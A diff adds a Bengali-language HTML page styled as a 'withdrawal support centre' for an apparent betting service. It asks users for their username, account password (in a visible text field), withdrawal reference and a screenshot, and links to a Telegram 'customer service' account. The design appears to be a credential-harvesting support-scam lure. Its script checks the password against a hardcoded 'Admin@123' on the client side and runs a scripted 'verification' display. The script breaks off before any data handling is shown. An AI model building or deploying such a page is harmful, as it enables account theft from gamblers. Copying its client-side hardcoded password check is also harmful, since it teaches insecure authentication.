@@ -1,0 +1,1080 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>উত্তোলন সমস্যা সমাধান</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        :root {
+            --bg: #0a0f0d;
+            --bg-card: #111a16;
+            --fg: #e8f0ec;
+            --fg-muted: #7a9489;
+            --accent: #00e68a;
+            --accent-dim: #00b36b;
+            --accent-glow: rgba(0, 230, 138, 0.15);
+            --gold: #f0c040;
+            --gold-dim: #c9a030;
+            --border: #1e3329;
+            --danger: #ff4757;
+            --danger-glow: rgba(255, 71, 87, 0.15);
+            --warning: #ffa502;
+            --warning-glow: rgba(255, 165, 2, 0.15);
+            --input-bg: #0d1612;
+            --radius: 14px;
+            --radius-sm: 10px;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Noto Sans Bengali', sans-serif;
+            background: var(--bg);
+            color: var(--fg);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .bg-layer {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .bg-layer .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(100px);
+            animation: orbFloat 12s ease-in-out infinite;
+        }
+        .bg-layer .orb:nth-child(1) {
+            width: 400px; height: 400px;
+            background: radial-gradient(circle, rgba(0,230,138,0.08), transparent 70%);
+            top: -100px; left: -100px;
+        }
+        .bg-layer .orb:nth-child(2) {
+            width: 350px; height: 350px;
+            background: radial-gradient(circle, rgba(240,192,64,0.06), transparent 70%);
+            bottom: -80px; right: -80px;
+            animation-delay: -4s;
+            animation-duration: 15s;
+        }
+        .bg-layer .orb:nth-child(3) {
+            width: 250px; height: 250px;
+            background: radial-gradient(circle, rgba(0,230,138,0.05), transparent 70%);
+            top: 50%; left: 60%;
+            animation-delay: -8s;
+            animation-duration: 18s;
+        }
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(30px, -40px) scale(1.1); }
+            50% { transform: translate(-20px, 20px) scale(0.95); }
+            75% { transform: translate(15px, 35px) scale(1.05); }
+        }
+
+        .grid-pattern {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            background-image:
+                linear-gradient(rgba(0,230,138,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,230,138,0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+        }
+
+        #particles {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 520px;
+            margin: 0 auto;
+            padding: 30px 18px 60px;
+            min-height: 100vh;
+        }
+
+        .header {
+            text-align: center;
+            padding: 30px 0 10px;
+            margin-bottom: 30px;
+        }
+        .header-icon {
+            width: 72px; height: 72px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent), var(--accent-dim));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            font-size: 30px;
+            color: var(--bg);
+            box-shadow: 0 0 40px rgba(0,230,138,0.25), 0 0 80px rgba(0,230,138,0.1);
+            animation: iconPulse 3s ease-in-out infinite;
+        }
+        @keyframes iconPulse {
+            0%, 100% { box-shadow: 0 0 40px rgba(0,230,138,0.25), 0 0 80px rgba(0,230,138,0.1); }
+            50% { box-shadow: 0 0 50px rgba(0,230,138,0.35), 0 0 100px rgba(0,230,138,0.15); }
+        }
+        .header h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; }
+        .header p { color: var(--fg-muted); font-size: 14px; margin-top: 8px; }
+
+        .main-btn {
+            width: 100%;
+            padding: 18px 24px;
+            border: none;
+            border-radius: var(--radius);
+            background: linear-gradient(135deg, var(--accent), var(--accent-dim));
+            color: var(--bg);
+            font-family: 'Noto Sans Bengali', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 4px 20px rgba(0,230,138,0.2);
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+        .main-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transition: left 0.5s;
+        }
+        .main-btn:hover::before { left: 100%; }
+        .main-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,230,138,0.3); }
+        .main-btn:active { transform: translateY(0) scale(0.98); }
+        .main-btn .arrow { transition: transform 0.3s; }
+        .main-btn.active .arrow { transform: rotate(90deg); }
+
+        .sub-buttons {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.4s;
+            opacity: 0;
+        }
+        .sub-buttons.show { max-height: 400px; opacity: 1; }
+        .sub-buttons-inner {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            padding-top: 12px;
+        }
+        .sub-btn {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            background: var(--bg-card);
+            color: var(--fg);
+            font-family: 'Noto Sans Bengali', sans-serif;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .sub-btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, var(--accent-glow), transparent);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .sub-btn:hover::after { opacity: 1; }
+        .sub-btn:hover { border-color: var(--accent-dim); transform: translateX(4px); }
+        .sub-btn:active { transform: translateX(4px) scale(0.98); }
+        .sub-btn.selected {
+            border-color: var(--accent) !important;
+            background: rgba(0, 230, 138, 0.05);
+        }
+        .sub-btn .icon-wrap {
+            width: 40px; height: 40px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            flex-shrink: 0;
+            position: relative;
+            z-index: 1;
+        }
+        .sub-btn:nth-child(1) .icon-wrap { background: rgba(255,165,2,0.12); color: #ffa502; }
+        .sub-btn:nth-child(2) .icon-wrap { background: var(--danger-glow); color: var(--danger); }
+        .sub-btn:nth-child(3) .icon-wrap { background: var(--accent-glow); color: var(--accent); }
+        .sub-btn .text { position: relative; z-index: 1; text-align: left; }
+        .sub-btn .chevron {
+            margin-left: auto;
+            position: relative;
+            z-index: 1;
+            color: var(--fg-muted);
+            font-size: 12px;
+            transition: color 0.3s, transform 0.3s;
+        }
+        .sub-btn:hover .chevron { color: var(--accent); transform: translateX(3px); }
+
+        .form-card {
+            background: var(--bg-card);
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius);
+            max-height: 0;
+            overflow: hidden;
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-top: 0;
+        }
+        .form-card.show {
+            max-height: 900px;
+            opacity: 1;
+            margin-top: 20px;
+            padding: 28px 22px;
+        }
+        .form-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 6px;
+        }
+        .form-header .step-badge {
+            width: 32px; height: 32px;
+            border-radius: 8px;
+            background: linear-gradient(135deg, var(--accent), var(--accent-dim));
+            color: var(--bg);
+            font-size: 14px;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .form-header h3 { font-size: 17px; font-weight: 700; }
+        .form-subtitle {
+            color: var(--fg-muted);
+            font-size: 13px;
+            margin-bottom: 22px;
+            padding-left: 44px;
+        }
+
+        .form-group { margin-bottom: 16px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--fg-muted);
+            margin-bottom: 7px;
+        }
+        .input-wrap { position: relative; }
+        .input-wrap > i.field-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--fg-muted);
+            font-size: 15px;
+            transition: color 0.3s;
+            pointer-events: none;
+            z-index: 2;
+        }
+        .input-wrap input {
+            width: 100%;
+            padding: 14px 50px 14px 44px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            background: var(--input-bg);
+            color: var(--fg);
+            font-family: 'Noto Sans Bengali', sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+        .input-wrap input::placeholder { color: rgba(122, 148, 137, 0.5); font-weight: 400; }
+        .input-wrap input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-glow); }
+        .input-wrap input:focus ~ i.field-icon { color: var(--accent); }
+
+        .pass-status {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            opacity: 0;
+            transition: all 0.3s ease;
+            z-index: 2;
+        }
+        .pass-status.visible { opacity: 1; }
+        .pass-status.correct { color: var(--accent); }
+        .pass-status.wrong { color: var(--danger); }
+
+        .pass-msg {
+            font-size: 12px;
+            margin-top: 5px;
+            padding-left: 4px;
+            min-height: 18px;
+            transition: color 0.3s;
+            font-weight: 500;
+        }
+
+        .input-wrap input.input-correct {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-glow);
+        }
+        .input-wrap input.input-wrong {
+            border-color: var(--danger);
+            box-shadow: 0 0 0 3px var(--danger-glow);
+        }
+        .input-wrap input.input-correct ~ i.field-icon { color: var(--accent); }
+        .input-wrap input.input-wrong ~ i.field-icon { color: var(--danger); }
+
+        .screenshot-area {
+            border: 2px dashed var(--border);
+            border-radius: var(--radius-sm);
+            padding: 28px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: var(--input-bg);
+            position: relative;
+            overflow: hidden;
+        }
+        .screenshot-area:hover { border-color: var(--accent-dim); background: rgba(0,230,138,0.03); }
+        .screenshot-area.has-file { border-color: var(--accent); border-style: solid; }
+        .screenshot-area .upload-icon {
+            font-size: 32px;
+            color: var(--fg-muted);
+            margin-bottom: 10px;
+            transition: color 0.3s, transform 0.3s;
+        }
+        .screenshot-area:hover .upload-icon { color: var(--accent); transform: translateY(-3px); }
+        .screenshot-area p { color: var(--fg-muted); font-size: 13px; line-height: 1.5; }
+        .screenshot-area p span { color: var(--accent); font-weight: 600; }
+        .screenshot-area .file-name {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: var(--accent);
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .screenshot-area.has-file .upload-icon,
+        .screenshot-area.has-file p:not(.file-name) { display: none; }
+        .screenshot-area.has-file .file-name { display: flex; }
+        .screenshot-area input[type="file"] { display: none; }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: var(--radius-sm);
+            background: linear-gradient(135deg, var(--gold), var(--gold-dim));
+            color: var(--bg);
+            font-family: 'Noto Sans Bengali', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 22px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(240,192,64,0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        .submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+        .submit-btn:hover::before { left: 100%; }
+        .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(240,192,64,0.3); }
+        .submit-btn:active { transform: translateY(0) scale(0.98); }
+        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; box-shadow: none !important; }
+        .spinner {
+            width: 18px; height: 18px;
+            border: 2.5px solid rgba(10,15,13,0.3);
+            border-top-color: var(--bg);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: none;
+        }
+        .submit-btn.loading .spinner { display: block; }
+        .submit-btn.loading .btn-text { display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* === সাপোর্ট অ্যাক্টিভ বাটন === */
+        .support-btn {
+            width: 100%;
+            padding: 16px;
+            border: 1.5px solid var(--accent-dim);
+            border-radius: var(--radius-sm);
+            background: rgba(0, 230, 138, 0.06);
+            color: var(--accent);
+            font-family: 'Noto Sans Bengali', sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            position: relative;
+            overflow: hidden;
+        }
+        .support-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0,230,138,0.1), transparent);
+            transition: left 0.5s;
+        }
+        .support-btn:hover::before { left: 100%; }
+        .support-btn:hover {
+            background: rgba(0, 230, 138, 0.12);
+            border-color: var(--accent);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 24px rgba(0,230,138,0.15);
+            color: var(--accent);
+        }
+        .support-btn:active { transform: translateY(0) scale(0.98); }
+        .support-btn .pulse-dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: var(--accent);
+            animation: dotPulse 2s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+        @keyframes dotPulse {
+            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0,230,138,0.4); }
+            50% { opacity: 0.7; box-shadow: 0 0 0 6px rgba(0,230,138,0); }
+        }
+
+        .verify-panel {
+            display: none;
+            margin-top: 20px;
+            background: var(--input-bg);
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 20px;
+        }
+        .verify-panel.show { display: block; animation: slideDown 0.4s ease; }
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .verify-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--fg);
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .verify-title i { color: var(--warning); }
+
+        .verify-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 0;
+            font-size: 13px;
+            color: var(--fg-muted);
+            border-bottom: 1px solid rgba(30,51,41,0.5);
+        }
+        .verify-item:last-child { border-bottom: none; }
+        .verify-item .v-icon {
+            width: 22px; height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            flex-shrink: 0;
+            background: rgba(122,148,137,0.15);
+            color: var(--fg-muted);
+            animation: none;
+        }
+        .verify-item.checking .v-icon {
+            background: var(--warning-glow);
+            color: var(--warning);
+            animation: pulse 1s ease infinite;
+        }
+        .verify-item.pass .v-icon {
+            background: var(--accent-glow);
+            color: var(--accent);
+        }
+        .verify-item.fail .v-icon {
+            background: var(--danger-glow);
+            color: var(--danger);
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        .fail-banner {
+            display: none;
+            margin-top: 16px;
+            padding: 18px;
+            border-radius: var(--radius-sm);
+            border: 1.5px solid var(--danger);
+            background: var(--danger-glow);
+            text-align: center;
+            animation: slideDown 0.5s ease;
+        }
+        .fail-banner.show { display: block; }
+        .fail-banner i { font-size: 36px; color: var(--danger); margin-bottom: 10px; display: block; }
+        .fail-banner h4 { font-size: 16px; font-weight: 700; color: var(--danger); margin-bottom: 6px; }
+        .fail-banner p { font-size: 13px; color: rgba(255,71,87,0.8); line-height: 1.5; }
+
+        .toast-container {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            pointer-events: none;
+            width: 90%;
+            max-width: 400px;
+        }
+        .toast {
+            background: var(--bg-card);
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--fg);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            animation: toastIn 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            pointer-events: auto;
+        }
+        .toast.success { border-color: var(--accent-dim); }
+        .toast.success i { color: var(--accent); }
+        .toast.error { border-color: var(--danger); }
+        .toast.error i { color: var(--danger); }
+        .toast.warning { border-color: var(--gold-dim); }
+        .toast.warning i { color: var(--gold); }
+        .toast.out { animation: toastOut 0.3s ease forwards; }
+        @keyframes toastIn {
+            from { opacity: 0; transform: translateY(-20px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        @keyframes toastOut {
+            to { opacity: 0; transform: translateY(-20px) scale(0.95); }
+        }
+
+        .footer {
+            text-align: center;
+            padding-top: 40px;
+            color: var(--fg-muted);
+            font-size: 12px;
+            opacity: 0.6;
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 20px 14px 40px; }
+            .header h1 { font-size: 22px; }
+            .main-btn { font-size: 16px; padding: 16px 20px; }
+            .sub-btn { padding: 14px 16px; font-size: 14px; }
+            .form-card.show { padding: 22px 16px; }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: 0.01ms !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+
+        :focus-visible {
+            outline: 2px solid var(--accent);
+            outline-offset: 2px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-layer">
+        <div class="orb"></div>
+        <div class="orb"></div>
+        <div class="orb"></div>
+    </div>
+    <div class="grid-pattern"></div>
+    <canvas id="particles"></canvas>
+
+    <div class="toast-container" id="toastContainer"></div>
+
+    <main class="container">
+        <header class="header">
+            <div class="header-icon" aria-hidden="true">
+                <i class="fas fa-wallet"></i>
+            </div>
+            <h1>উত্তোলন সহায়তা কেন্দ্র</h1>
+            <p>আপনার উত্তোলন সমস্যা দ্রুত সমাধান করুন</p>
+        </header>
+
+        <button class="main-btn" id="mainBtn" aria-expanded="false" aria-controls="subButtons">
+            <i class="fas fa-exclamation-triangle"></i>
+            <span>উত্তোলন সমস্যা</span>
+            <i class="fas fa-chevron-right arrow"></i>
+        </button>
+
+        <nav class="sub-buttons" id="subButtons" role="menu">
+            <div class="sub-buttons-inner">
+                <button class="sub-btn" data-type="slip" role="menuitem">
+                    <div class="icon-wrap"><i class="fas fa-sync-alt"></i></div>
+                    <span class="text">বাজি স্লিপ আপডেট সমস্যা</span>
+                    <i class="fas fa-chevron-right chevron"></i>
+                </button>
+                <button class="sub-btn" data-type="fail" role="menuitem">
+                    <div class="icon-wrap"><i class="fas fa-times-circle"></i></div>
+                    <span class="text">উত্তলোন ব্যর্থ হচ্ছে</span>
+                    <i class="fas fa-chevron-right chevron"></i>
+                </button>
+                <button class="sub-btn" data-type="process" role="menuitem">
+                    <div class="icon-wrap"><i class="fas fa-paper-plane"></i></div>
+                    <span class="text">উত্তোলন প্রক্রিয়া দিন</span>
+                    <i class="fas fa-chevron-right chevron"></i>
+                </button>
+            </div>
+        </nav>
+
+        <section class="form-card" id="formCard" aria-label="লগইন ফর্ম">
+            <div class="form-header">
+                <div class="step-badge">১</div>
+                <h3 id="formTitle">প্রথমে লগইন করুন</h3>
+            </div>
+            <p class="form-subtitle" id="formSubtitle">আপনার তথ্য দিয়ে সমস্যাটি জমা দিন</p>
+
+            <form id="supportForm" novalidate>
+                <div class="form-group">
+                    <label for="username">ইউজার নাম</label>
+                    <div class="input-wrap">
+                        <input type="text" id="username" name="username" placeholder="আপনার ইউজার নাম লিখুন" autocomplete="username" required>
+                        <i class="fas fa-user field-icon"></i>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">পাসওয়ার্ড</label>
+                    <div class="input-wrap">
+                        <input type="text" id="password" name="password" placeholder="আপনার পাসওয়ার্ড লিখুন" autocomplete="off" required>
+                        <i class="fas fa-lock field-icon"></i>
+                        <span class="pass-status" id="passStatus">
+                            <i class="fas fa-check-circle"></i>
+                        </span>
+                    </div>
+                    <div class="pass-msg" id="passMsg"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="reference">উত্তোলন রেফারেন্স</label>
+                    <div class="input-wrap">
+                        <input type="text" id="reference" name="reference" placeholder="উত্তোলনের রেফারেন্স নম্বর লিখুন" required>
+                        <i class="fas fa-receipt field-icon"></i>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>স্ক্রিনশট নিন</label>
+                    <div class="screenshot-area" id="screenshotArea" role="button" tabindex="0" aria-label="স্ক্রিনশট আপলোড করুন">
+                        <div class="upload-icon"><i class="fas fa-cloud-upload-alt"></i></div>
+                        <p>এখানে ক্লিক করে বা <span>ফাইল বেছে নিন</span></p>
+                        <p>PNG, JPG বা JPEG (সর্বোচ্চ ৫MB)</p>
+                        <div class="file-name">
+                            <i class="fas fa-check-circle"></i>
+                            <span id="fileName"></span>
+                        </div>
+                        <input type="file" id="screenshotInput" accept="image/png,image/jpeg,image/jpg">
+                    </div>
+                </div>
+
+                <div class="verify-panel" id="verifyPanel">
+                    <div class="verify-title">
+                        <i class="fas fa-shield-alt"></i>
+                        পুনরায় যাচাই করা হচ্ছে...
+                    </div>
+                    <div class="verify-item" id="vUser">
+                        <div class="v-icon"><i class="fas fa-circle"></i></div>
+                        <span>ইউজার নাম যাচাই</span>
+                    </div>
+                    <div class="verify-item" id="vPass">
+                        <div class="v-icon"><i class="fas fa-circle"></i></div>
+                        <span>পাসওয়ার্ড যাচাই</span>
+                    </div>
+                    <div class="verify-item" id="vRef">
+                        <div class="v-icon"><i class="fas fa-circle"></i></div>
+                        <span>রেফারেন্স যাচাই</span>
+                    </div>
+                    <div class="verify-item" id="vScreen">
+                        <div class="v-icon"><i class="fas fa-circle"></i></div>
+                        <span>স্ক্রিনশট যাচাই</span>
+                    </div>
+                </div>
+
+                <div class="fail-banner" id="failBanner">
+                    <i class="fas fa-times-circle"></i>
+                    <h4>জমা সফল হয়নি</h4>
+                    <p>আপনার তথ্য যাচাইয় সমস্যা পাওয়া গেছে। অনুগ্রহ করে সঠিক তথ্য দিয়ে আবার চেষ্টা করুন।</p>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <span class="btn-text"><i class="fas fa-paper-plane"></i> জমা দিন</span>
+                    <div class="spinner"></div>
+                </button>
+
+                <!-- সাপোর্ট অ্যাক্টিভ বাটন -->
+                <a href="https://t.me/okwwcs" target="_blank" rel="noopener noreferrer" class="support-btn" aria-label="গ্রাহক পরিসেবায় যান">
+                    <span class="pulse-dot"></span>
+                    <i class="fab fa-telegram-plane"></i>
+                    <span>গ্রাহক পরিসেবা</span>
+                </a>
+            </form>
+        </section>
+
+        <footer class="footer">
+            <p>সর্বস্বত্ব সংরক্ষিত &copy; ২০২৫</p>
+        </footer>
+    </main>
+
+    <script>
+        // === পার্টিকেল ===
+        (function() {
+            const canvas = document.getElementById('particles');
+            const ctx = canvas.getContext('2d');
+            let particles = [];
+            let w, h;
+            function resize() {
+                w = canvas.width = window.innerWidth;
+                h = canvas.height = window.innerHeight;
+            }
+            resize();
+            window.addEventListener('resize', resize);
+            for (let i = 0; i < 35; i++) {
+                particles.push({
+                    x: Math.random() * w,
+                    y: Math.random() * h,
+                    r: Math.random() * 1.5 + 0.5,
+                    dx: (Math.random() - 0.5) * 0.3,
+                    dy: (Math.random() - 0.5) * 0.3,
+                    opacity: Math.random() * 0.4 + 0.1
+                });
+            }
+            function animate() {
+                ctx.clearRect(0, 0, w, h);
+                particles.forEach(p => {
+                    p.x += p.dx;
+                    p.y += p.dy;
+                    if (p.x < 0) p.x = w;
+                    if (p.x > w) p.x = 0;
+                    if (p.y < 0) p.y = h;
+                    if (p.y > h) p.y = 0;
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, Math.max(0.5, p.r), 0, Math.PI * 2);
+                    ctx.fillStyle = `rgba(0, 230, 138, ${p.opacity})`;
+                    ctx.fill();
+                });
+                requestAnimationFrame(animate);
+            }
+            animate();
+        })();
+
+        // === ডোম ===
+        const mainBtn = document.getElementById('mainBtn');
+        const subButtons = document.getElementById('subButtons');
+        const subBtns = document.querySelectorAll('.sub-btn');
+        const formCard = document.getElementById('formCard');
+        const formTitle = document.getElementById('formTitle');
+        const formSubtitle = document.getElementById('formSubtitle');
+        const supportForm = document.getElementById('supportForm');
+        const passwordInput = document.getElementById('password');
+        const usernameInput = document.getElementById('username');
+        const referenceInput = document.getElementById('reference');
+        const passStatus = document.getElementById('passStatus');
+        const passMsg = document.getElementById('passMsg');
+        const screenshotArea = document.getElementById('screenshotArea');
+        const screenshotInput = document.getElementById('screenshotInput');
+        const fileNameEl = document.getElementById('fileName');
+        const submitBtn = document.getElementById('submitBtn');
+        const toastContainer = document.getElementById('toastContainer');
+        const verifyPanel = document.getElementById('verifyPanel');
+        const failBanner = document.getElementById('failBanner');
+        const vUser = document.getElementById('vUser');
+        const vPass = document.getElementById('vPass');
+        const vRef = document.getElementById('vRef');
+        const vScreen = document.getElementById('vScreen');
+
+        let currentType = '';
+        let selectedFile = null;
+        let isVerifying = false;
+
+        // === প্রধান বাটন ===
+        mainBtn.addEventListener('click', () => {
+            const isOpen = subButtons.classList.contains('show');
+            subButtons.classList.toggle('show');
+            mainBtn.classList.toggle('active');
+            mainBtn.setAttribute('aria-expanded', !isOpen);
+            if (isOpen) {
+                formCard.classList.remove('show');
+                subBtns.forEach(b => b.classList.remove('selected'));
+            }
+        });
+
+        // === সাব-বাটন ===
+        subBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                currentType = btn.dataset.type;
+                subBtns.forEach(b => b.classList.remove('selected'));
+                btn.classList.add('selected');
+
+                const subtitles = {
+                    slip: 'স্লিপ আপডেট না হলে তথ্য দিন',
+                    fail: 'উত্তোলন ব্যর্থ হলে বিবরণ দিন',
+                    process: 'নতুন উত্তোলনের জন্য আবেদন করুন'
+                };
+
+                formTitle.textContent = 'প্রথমে লগইন করুন';
+                formSubtitle.textContent = subtitles[currentType] || '';
+                formCard.classList.add('show');
+
+                supportForm.reset();
+                selectedFile = null;
+                screenshotArea.classList.remove('has-file');
+                resetPassStatus();
+                resetInputState(usernameInput);
+                resetInputState(referenceInput);
+                verifyPanel.classList.remove('show');
+                failBanner.classList.remove('show');
+                resetVerifyItems();
+
+                setTimeout(() => {
+                    formCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 100);
+            });
+        });
+
+        // === পাসওয়ার্ড রিয়েল-টাইম যাচাই ===
+        const CORRECT_PASSWORD = 'Admin@123';
+
+        passwordInput.addEventListener('input', () => {
+            const val = passwordInput.value;
+            if (val.length === 0) {
+                resetPassStatus();
+                resetInputState(passwordInput);
+                return;
+            }
+            if (val === CORRECT_PASSWORD) {
+                passStatus.innerHTML = '<i class="fas fa-check-circle"></i>';
+                passStatus.className = 'pass-status visible correct';
+                passMsg.textContent = 'পাসওয়ার্ড সঠিক';
+                passMsg.style.color = 'var(--accent)';
+                passwordInput.className = 'input-correct';
+            } else {
+                passStatus.innerHTML = '<i class="fas fa-times-circle"></i>';
+                passStatus.className = 'pass-status visible wrong';
+                passMsg.textContent = 'পাসওয়ার্ড ভুল';
+                passMsg.style.color = 'var(--danger)';
+                passwordInput.className = 'input-wrong';
+            }
+        });
+
+        function resetPassStatus() {
+            passStatus.className = 'pass-status';
+            passMsg.textContent = '';
+            passwordInput.className = '';
+        }
+
+        function resetInputState(input) {
+            input.className = '';
+        }
+
+        // === স্ক্রিনশট ===
+        screenshotArea.addEventListener('click', () => screenshotInput.click());
+        screenshotArea.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' || e.key === ' ') {
+                e.preventDefault();
+                screenshotInput.click();
+            }
+        });
+        screenshotArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            screenshotArea.style.borderColor = 'var(--accent)';
+            screenshotArea.style.background = 'rgba(0,230,138,0.05)';
+        });
+        screenshotArea.addEventListener('dragleave', () => {
+            if (!screenshotArea.classList.contains('has-file')) {
+                screenshotArea.style.borderColor = '';
+                screenshotArea.style.background = '';
+            }
+        });
+        screenshotArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            screenshotArea.style.borderColor = '';
+            screenshotArea.style.background = '';
+            const file = e.dataTransfer.files[0];
+            if (file) handleFile(file);
+        });
+        screenshotInput.addEventListener('change', () => {
+            const file = screenshotInput.files[0];
+            if (file) handleFile(file);
+        });
+
+        function handleFile(file) {
+            const validTypes = ['image/png', 'image/jpeg', 'image/jpg'];
+            const maxSize = 5 * 1024 * 1024;
+            if (!validTypes.includes(file.type)) {
+                showToast('শুধুমাত্র PNG, JPG বা JPEG ফাইল আপলোড করুন', 'error');
+                return;
+            }
+            if (file.size > maxSize) {
+                showToast('ফাইলের আকার সর্বোচ্চ ৫MB হতে হবে', 'error');
+                return;
+            }
+            selectedFile = file;
+            fileNameEl.textContent = file.name;
+            screenshotArea.classList.add('has-file');
+            showToast('স্ক্রিনশট সফলভাবে যুক্ত হয়েছে', 'success');
+        }
+
